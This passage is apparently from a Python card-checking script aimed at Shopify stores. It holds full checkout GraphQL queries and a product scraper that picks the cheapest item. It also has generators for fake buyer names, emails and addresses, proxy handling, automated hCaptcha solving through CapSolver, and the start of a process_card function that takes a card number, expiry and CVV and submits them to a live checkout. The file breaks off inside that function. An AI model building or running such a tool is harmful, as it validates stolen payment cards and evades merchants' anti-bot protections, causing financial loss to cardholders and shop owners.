import asyncio
import aiohttp
import json
import re
import random
import os
from urllib.parse import urlparse

CAPSOLVER_KEY = os.environ.get('CAPSOLVER_API_KEY', '')

QUERY_PROPOSAL_SHIPPING = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{__typename}...on AcceptNewTermViolation{__typename}...on ConfirmChangeViolation{__typename}...on UnprocessableTermViolation{__typename}...on UnresolvableTermViolation{__typename}...on ApplyChangeViolation{__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}}}fragment FilledMerchandiseTermsFragment on FilledMerchandiseTerms{merchandiseLines{stableId merchandise{...on ProductVariantMerchandise{id digest title sku requiresShipping deferredComponentMerchandise{...on DeferredProductVariantMerchandise{id digest __typename}__typename}image{altText one:transformedSrc(maxWidth:60 maxHeight:60)two:transformedSrc(maxWidth:120 maxHeight:120)four:transformedSrc(maxWidth:240 maxHeight:240)__typename}product{id vendor productType tags handle title featuredImage{url __typename}__typename}price{amount currencyCode __typename}compareAtPrice{amount currencyCode __typename}sellingPlan{id name billingPolicy{...on SellingPlanRecurringBillingPolicy{intervalCount interval __typename}__typename}__typename}__typename}...on GiftCardMerchandise{balance{amount currencyCode __typename}__typename}...on CustomMerchandise{price{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}lineComponents{...on BundleLineComponent{__typename stableId merchandise{...on ProductVariantMerchandise{id digest sku title requiresShipping image{altText one:transformedSrc(maxWidth:60 maxHeight:60)two:transformedSrc(maxWidth:120 maxHeight:120)four:transformedSrc(maxWidth:240 maxHeight:240)__typename}product{id vendor productType tags handle __typename}price{amount currencyCode __typename}sellingPlan{id name billingPolicy{...on SellingPlanRecurringBillingPolicy{intervalCount interval __typename}__typename}__typename}__typename}__typename}quantity{...on ProposedQuantity{items{value __typename}__typename}...on FixedQuantity{items{value __typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}quantity{...on ProposedQuantity{items{value __typename}__typename}...on FixedQuantity{items{value __typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}firstPaymentPrice{amount currencyCode __typename}__typename}lineDiscounts{__typename}lineTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}fragment ProposalDetails on SellerProposal{merchandiseDiscount{__typename}deliveryDiscount{__typename}delivery{...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}...on FilledDeliveryTerms{progressiveRatesEstimatedTime deliveryLines{availableDeliveryStrategies{handle title acceptsInstructions phoneRequired amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}targetMerchandiseLines{...FilledMerchandiseTermsFragment __typename}__typename}__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{paymentMethod{...on DirectPaymentMethod{paymentMethodIdentifier name extensibilityDisplayName billingAddress{...on StreetAddress{firstName lastName company address1 address2 city zoneCode postalCode countryCode __typename}__typename}cardSource creditCardLastFourDigits cardBrand cardExpiry{month year __typename}__typename}...on WalletsPlatformPaymentMethod{name paymentMethodIdentifier extensibilityDisplayName __typename}...on CustomPaymentMethod{id name extensibilityDisplayName paymentMethodIdentifier __typename}...on GiftCardPaymentMethod{__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}merchandise{...FilledMerchandiseTermsFragment __typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{amount currencyCode __typename}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}taxes{taxAmount{amount currencyCode __typename}taxExemptions title rate lineAllocations{stableId taxAmount{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}__typename}
"""

QUERY_PROPOSAL_DELIVERY = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{__typename}...on AcceptNewTermViolation{__typename}...on ConfirmChangeViolation{__typename}...on UnprocessableTermViolation{__typename}...on UnresolvableTermViolation{__typename}...on ApplyChangeViolation{__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}}}fragment FilledMerchandiseTermsFragment on FilledMerchandiseTerms{merchandiseLines{stableId merchandise{...on ProductVariantMerchandise{id digest title sku requiresShipping deferredComponentMerchandise{...on DeferredProductVariantMerchandise{id digest __typename}__typename}image{altText one:transformedSrc(maxWidth:60 maxHeight:60)two:transformedSrc(maxWidth:120 maxHeight:120)four:transformedSrc(maxWidth:240 maxHeight:240)__typename}product{id vendor productType tags handle title featuredImage{url __typename}__typename}price{amount currencyCode __typename}compareAtPrice{amount currencyCode __typename}sellingPlan{id name billingPolicy{...on SellingPlanRecurringBillingPolicy{intervalCount interval __typename}__typename}__typename}__typename}...on GiftCardMerchandise{balance{amount currencyCode __typename}__typename}...on CustomMerchandise{price{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}lineComponents{...on BundleLineComponent{__typename stableId merchandise{...on ProductVariantMerchandise{id digest sku title requiresShipping image{altText one:transformedSrc(maxWidth:60 maxHeight:60)two:transformedSrc(maxWidth:120 maxHeight:120)four:transformedSrc(maxWidth:240 maxHeight:240)__typename}product{id vendor productType tags handle __typename}price{amount currencyCode __typename}sellingPlan{id name billingPolicy{...on SellingPlanRecurringBillingPolicy{intervalCount interval __typename}__typename}__typename}__typename}__typename}quantity{...on ProposedQuantity{items{value __typename}__typename}...on FixedQuantity{items{value __typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}quantity{...on ProposedQuantity{items{value __typename}__typename}...on FixedQuantity{items{value __typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}firstPaymentPrice{amount currencyCode __typename}__typename}lineDiscounts{__typename}lineTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}fragment ProposalDetails on SellerProposal{merchandiseDiscount{__typename}deliveryDiscount{__typename}delivery{...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}...on FilledDeliveryTerms{progressiveRatesEstimatedTime deliveryLines{availableDeliveryStrategies{handle title acceptsInstructions phoneRequired amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}targetMerchandiseLines{...FilledMerchandiseTermsFragment __typename}__typename}__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{paymentMethod{...on DirectPaymentMethod{paymentMethodIdentifier name extensibilityDisplayName billingAddress{...on StreetAddress{firstName lastName company address1 address2 city zoneCode postalCode countryCode __typename}__typename}cardSource creditCardLastFourDigits cardBrand cardExpiry{month year __typename}__typename}...on WalletsPlatformPaymentMethod{name paymentMethodIdentifier extensibilityDisplayName __typename}...on CustomPaymentMethod{id name extensibilityDisplayName paymentMethodIdentifier __typename}...on GiftCardPaymentMethod{__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}merchandise{...FilledMerchandiseTermsFragment __typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{amount currencyCode __typename}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}taxes{taxAmount{amount currencyCode __typename}taxExemptions title rate lineAllocations{stableId taxAmount{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}__typename}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{__typename}__typename}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionType totalAmountToPay{amount currencyCode __typename}hasMultipleShipments lineItems{...ReceiptLineItemDetails __typename}recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}firstPaymentPrice{amount currencyCode __typename}__typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}shopPayInstallmentsDetails{__typename}discounts{__typename}shippingLine{__typename}taxLines{rate title taxAmount{amount currencyCode __typename}__typename}totalTax{amount currencyCode __typename}totalShippingPrice{amount currencyCode __typename}totalDuties{amount currencyCode __typename}totalTip{amount currencyCode __typename}paymentLines{__typename}creditLines{__typename}giftCardLines{__typename}totalRefund{amount currencyCode __typename}__typename}fragment ReceiptLineItemDetails on PurchaseOrderLineItem{...on VariantPurchaseOrderLineItem{id title quantity image{altText one:transformedSrc(maxWidth:60 maxHeight:60)two:transformedSrc(maxWidth:120 maxHeight:120)four:transformedSrc(maxWidth:240 maxHeight:240)__typename}totalAmount{amount currencyCode __typename}__typename}...on CustomPurchaseOrderLineItem{id title quantity image{altText one:transformedSrc(maxWidth:60 maxHeight:60)two:transformedSrc(maxWidth:120 maxHeight:120)four:transformedSrc(maxWidth:240 maxHeight:240)__typename}totalAmount{amount currencyCode __typename}__typename}__typename}
"""

MUTATION_SUBMIT = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}__typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}__typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}__typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}__typename}...on ApplyChangeViolation{message{code localizedDescription __typename}from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{__typename}__typename}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionType totalAmountToPay{amount currencyCode __typename}hasMultipleShipments lineItems{...ReceiptLineItemDetails __typename}recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}firstPaymentPrice{amount currencyCode __typename}__typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}shopPayInstallmentsDetails{__typename}discounts{__typename}shippingLine{__typename}taxLines{rate title taxAmount{amount currencyCode __typename}__typename}totalTax{amount currencyCode __typename}totalShippingPrice{amount currencyCode __typename}totalDuties{amount currencyCode __typename}totalTip{amount currencyCode __typename}paymentLines{__typename}creditLines{__typename}giftCardLines{__typename}totalRefund{amount currencyCode __typename}__typename}fragment ReceiptLineItemDetails on PurchaseOrderLineItem{...on VariantPurchaseOrderLineItem{id title quantity image{altText one:transformedSrc(maxWidth:60 maxHeight:60)two:transformedSrc(maxWidth:120 maxHeight:120)four:transformedSrc(maxWidth:240 maxHeight:240)__typename}totalAmount{amount currencyCode __typename}__typename}...on CustomPurchaseOrderLineItem{id title quantity image{altText one:transformedSrc(maxWidth:60 maxHeight:60)two:transformedSrc(maxWidth:120 maxHeight:120)four:transformedSrc(maxWidth:240 maxHeight:240)__typename}totalAmount{amount currencyCode __typename}__typename}__typename}fragment FilledMerchandiseTermsFragment on FilledMerchandiseTerms{merchandiseLines{stableId merchandise{...on ProductVariantMerchandise{id digest title sku requiresShipping image{altText one:transformedSrc(maxWidth:60)__typename}product{id vendor productType tags handle title __typename}price{amount currencyCode __typename}__typename}__typename}quantity{...on ProposedQuantity{items{value __typename}__typename}...on FixedQuantity{items{value __typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}fragment ProposalDetails on SellerProposal{delivery{...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{handle amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{paymentMethod{...on DirectPaymentMethod{paymentMethodIdentifier name extensibilityDisplayName __typename}...on WalletsPlatformPaymentMethod{name paymentMethodIdentifier extensibilityDisplayName __typename}...on CustomPaymentMethod{id name extensibilityDisplayName paymentMethodIdentifier __typename}__typename}__typename}__typename}__typename}merchandise{...FilledMerchandiseTermsFragment __typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{amount currencyCode __typename}__typename}__typename}__typename}
"""

QUERY_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsiteRedirect offsiteRedirectUrl __typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionType totalAmountToPay{amount currencyCode __typename}lineItems{...ReceiptLineItemDetails __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}totalTax{amount currencyCode __typename}totalShippingPrice{amount currencyCode __typename}paymentLines{__typename}__typename}fragment ReceiptLineItemDetails on PurchaseOrderLineItem{...on VariantPurchaseOrderLineItem{id title quantity totalAmount{amount currencyCode __typename}__typename}...on CustomPurchaseOrderLineItem{id title quantity totalAmount{amount currencyCode __typename}__typename}__typename}
"""

C2C = {
    "USD": "US", "CAD": "CA", "INR": "IN",
    "AED": "AE", "HKD": "HK", "GBP": "GB", "CHF": "CH",
}

book = {
    "US":      {"address1": "123 Main",              "city": "NY",       "postalCode": "10080",   "zoneCode": "NY",  "countryCode": "US", "phone": "2194157586"},
    "CA":      {"address1": "88 Queen",              "city": "Toronto",  "postalCode": "M5J2J3",  "zoneCode": "ON",  "countryCode": "CA", "phone": "4165550198"},
    "GB":      {"address1": "221B Baker Street",     "city": "London",   "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
    "IN":      {"address1": "221B MG",               "city": "Mumbai",   "postalCode": "400001",  "zoneCode": "MH",  "countryCode": "IN", "phone": "+91 9876543210"},
    "AE":      {"address1": "Burj Tower",            "city": "Dubai",    "postalCode": "",        "zoneCode": "DU",  "countryCode": "AE", "phone": "+971 50 123 4567"},
    "HK":      {"address1": "Nathan 88",             "city": "Kowloon",  "postalCode": "",        "zoneCode": "KL",  "countryCode": "HK", "phone": "+852 5555 5555"},
    "CN":      {"address1": "8 Zhongguancun Street", "city": "Beijing",  "postalCode": "100080",  "zoneCode": "BJ",  "countryCode": "CN", "phone": "1062512345"},
    "CH":      {"address1": "Gotthardstrasse 17",    "city": "Schweiz",  "postalCode": "6430",    "zoneCode": "SZ",  "countryCode": "CH", "phone": "445512345"},
    "AU":      {"address1": "1 Martin Place",        "city": "Sydney",   "postalCode": "2000",    "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DEFAULT": {"address1": "123 Main",              "city": "New York", "postalCode": "10080",   "zoneCode": "NY",  "countryCode": "US", "phone": "2194157586"},
}

def pick_addr(url, cc=None, rc=None):
    cc = (cc or "").upper()
    rc = (rc or "").upper()
    dom = urlparse(url).netloc
    tcn = dom.split('.')[-1].upper()
    if tcn in book:
        return book[tcn]
    ccn = C2C.get(cc)
    if rc in book and ccn == rc:
        return book[rc]
    elif rc in book:
        return book[rc]
    return book["DEFAULT"]

def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1 and end in parts[1]:
                result = parts[1].split(end, 1)[0]
                return result if result else None
    except Exception:
        pass
    return None

class _Utils:
    @staticmethod
    def get_random_name():
        first = ["James","John","Robert","Michael","William","David","Mary","Patricia","Jennifer","Linda"]
        last  = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez"]
        return (random.choice(first), random.choice(last))

    @staticmethod
    def generate_email(first, last):
        domains = ["gmail.com","yahoo.com","outlook.com","protonmail.com"]
        return f"{first.lower()}.{last.lower()}@{random.choice(domains)}"

def _parse_proxy(proxy_str):
    if not proxy_str:
        return None
    parts = proxy_str.split(':')
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    elif len(parts) == 4:
        ip, port, user, password = parts
        return f"http://{user}:{password}@{ip}:{port}"
    return None

def _is_captcha(text):
    if not text:
        return False
    t = text.upper()
    return any(x.upper() in t for x in [
        'CAPTCHA_REQUIRED','"code":"CAPTCHA_REQUIRED"','captcha required',
        'CAPTCHA CHALLENGE','hcaptcha','h-captcha'
    ])

SHOPIFY_DEFAULT_SITEKEY = 'a5f74b19-9e45-40e0-b45d-47ff91b7a6c2'

def _extract_sitekey(resp_text='', page_html=''):
    combined = (resp_text or '') + (page_html or '')
    patterns = [
        r'"sitekey"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"',
        r'"captchaSiteKey"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"',
        r'data-sitekey="([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"',
        r'"key"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"',
    ]
    for pat in patterns:
        m = re.search(pat, combined, re.IGNORECASE)
        if m:
            return m.group(1)
    return SHOPIFY_DEFAULT_SITEKEY

async def _solve_hcaptcha(page_url, sitekey, api_key):
    if not api_key:
        return None
    try:
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=120)
        ) as s:
            cr = await s.post(
                'https://api.capsolver.com/createTask',
                json={
                    'clientKey': api_key,
                    'task': {
                        'type': 'HCaptchaTaskProxyless',
                        'websiteURL': page_url,
                        'websiteKey': sitekey,
                    }
                }
            )
            cd = await cr.json()
            task_id = cd.get('taskId')
            if not task_id:
                return None
            for _ in range(30):
                await asyncio.sleep(4)
                pr = await s.post(
                    'https://api.capsolver.com/getTaskResult',
                    json={'clientKey': api_key, 'taskId': task_id}
                )
                rd = await pr.json()
                status = rd.get('status', '')
                if status == 'ready':
                    return rd.get('solution', {}).get('gRecaptchaResponse')
                if status == 'failed':
                    return None
    except Exception:
        pass
    return None

def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    message = str(message)
    patterns = [
        r'(PAYMENTS_[A-Z_]+)', r'(CARD_[A-Z_]+)',
        r'([A-Z]+_[A-Z]+_[A-Z_]+)', r'([A-Z]+_[A-Z_]+)',
        r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?',
        r'{"code":"([^"]+)"', r"'code':'([^']+)'"
    ]
    for pat in patterns:
        matches = re.findall(pat, message, re.IGNORECASE)
        for m in matches:
            if isinstance(m, tuple): m = m[0]
            if m and "_" in m and len(m) < 50:
                return m.strip("{}:'\" ")
    return message[:50]

async def _gql(session, url, params, headers, data, max_retries=1):
    for attempt in range(max_retries + 1):
        try:
            r = await session.post(url, params=params, headers=headers, json=data)
            return r, await r.text()
        except Exception as e:
            if attempt == max_retries:
                return None, str(e)
            await asyncio.sleep(1)
    return None, "max retries"

async def fetch_products(domain, proxy_str=None):
    try:
        if not domain.startswith('http'):
            domain = "https://" + domain
        connector = aiohttp.TCPConnector(ssl=False)
        proxy = _parse_proxy(proxy_str)
        async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=10)) as s:
            async with s.get(f"{domain}/products.json", proxy=proxy) as resp:
                if resp.status != 200:
                    return False, f"Site Error {resp.status}"
                text = await resp.text()
                if "shopify" not in text.lower():
                    return False, "Not a Shopify site"
                products = (await resp.json())['products']
                if not products:
                    return False, "No products found"

        min_price = float('inf')
        min_product = None
        for product in products:
            for variant in product.get('variants', []):
                if not variant.get('available', True):
                    continue
                try:
                    price = float(str(variant.get('price','0')).replace(',',''))
                    if price < min_price:
                        min_price = price
                        min_product = {
                            'site': domain,
                            'price': f"{price:.2f}",
                            'variant_id': str(variant['id']),
                            'link': f"{domain}/products/{product['handle']}"
                        }
                except Exception:
                    continue

        if min_product and min_product.get('variant_id'):
            return True, min_product
        return False, "No valid products"
    except Exception as e:
        return False, str(e)[:80]

async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    gateway = "Shopify Payments"
    total_price = "0.00"
    currency = "USD"
    ourl = site_url if site_url.startswith('http') else f'https://{site_url}'
    payment_identifier = None
    proxy = _parse_proxy(proxy_str)
    checkpoint_data = None
    running_total = "0.00"

    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json',
            'Origin': ourl,
            'Referer': ourl
        }

        address_info = pick_addr(ourl)
        country_code = address_info["countryCode"]
        firstName, lastName = _Utils.get_random_name()
        email = _Utils.generate_email(firstName, lastName)
        phone   = address_info["phone"]
        street  = address_info["address1"]
        city    = address_info["city"]
        state   = address_info["zoneCode"]
        s_zip   = address_info["postalCode"]
        address2 = ""

        if not variant_id:
            ok, info = await fetch_products(ourl, proxy_str)
            if not ok:
                return False, info, gateway, total_price, currency
            variant_id = info['variant_id']

        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=30)) as session:
